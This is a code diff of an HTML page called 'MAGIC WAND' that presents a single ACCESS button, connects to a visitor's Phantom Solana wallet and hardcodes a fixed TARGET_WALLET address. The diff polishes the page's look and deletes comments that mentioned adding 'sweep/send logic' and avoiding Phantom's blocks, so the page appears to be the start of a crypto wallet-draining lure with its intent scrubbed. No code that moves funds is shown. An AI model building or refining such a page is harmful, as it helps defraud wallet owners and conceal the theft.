@@ -5,26 +5,65 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>MAGIC WAND</title>
   <meta name="description" content="Private wallet utility" />
+
   <style>
-    html, body { margin:0; height:100%; background:#fff; }
-    .wrap { display:flex; align-items:center; justify-content:center; height:100%; }
+    /* ====== BACKGROUND IMAGE SECTION ====== */
+    html, body {
+      height: 100%;
+      margin: 0;
+      /* Use your uploaded file name here */
+      background: url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell;
+    }
+
+    /* Optional translucent overlay to improve contrast */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.35); /* dark overlay; adjust opacity as you like */
+      z-index: 0;
+    }
+
+    /* ====== BUTTON CENTERING ====== */
+    .wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+      position: relative;
+      z-index: 1; /* keeps button above the overlay */
+    }
+
+    /* ====== ACCESS BUTTON STYLE ====== */
     button {
       font: 600 18px system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell;
-      padding: 18px 28px; border: 0; border-radius: 16px; cursor: pointer;
-      box-shadow: 0 8px 24px rgba(0,0,0,.08);
+      padding: 18px 32px;
+      border: 0;
+      border-radius: 16px;
+      cursor: pointer;
+      background: rgba(255,255,255,0.85);
+      box-shadow: 0 8px 24px rgba(0,0,0,.25);
+      backdrop-filter: blur(6px);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 10px 32px rgba(0,0,0,.35);
     }
   </style>
 </head>
+
 <body>
   <div class="wrap">
     <button id="access">ACCESS</button>
   </div>
 
   <script>
-    // Optional: set a *fixed* target wallet for your app logic (example below).
     const TARGET_WALLET = "9yJJKMbWJmTrDANHq1zw4Wribu27bMzJrQpzBhvZksi";
 
-    // Phantom deep-link opener for mobile (fallback if window.solana not injected)
     function openPhantomDeepLink() {
       const url = "https://phantom.app/ul/browse/" + encodeURIComponent(location.href);
       window.location.href = url;
@@ -34,16 +73,12 @@
       try {
         if (window.solana && window.solana.isPhantom) {
           const resp = await window.solana.connect({ onlyIfTrusted: false });
-          // At this point you have resp.publicKey.toString()
-          // TODO: call your sweep/send logic here (client-side).
           alert("Connected: " + resp.publicKey.toString());
         } else {
-          // Not inside Phantom / extension not injected → try opening Phantom’s in-app browser
           openPhantomDeepLink();
         }
       } catch (e) {
         console.error(e);
-        // Keep the page white and idle; no auto-refire loop to avoid Phantom blocks
       }
     }
 
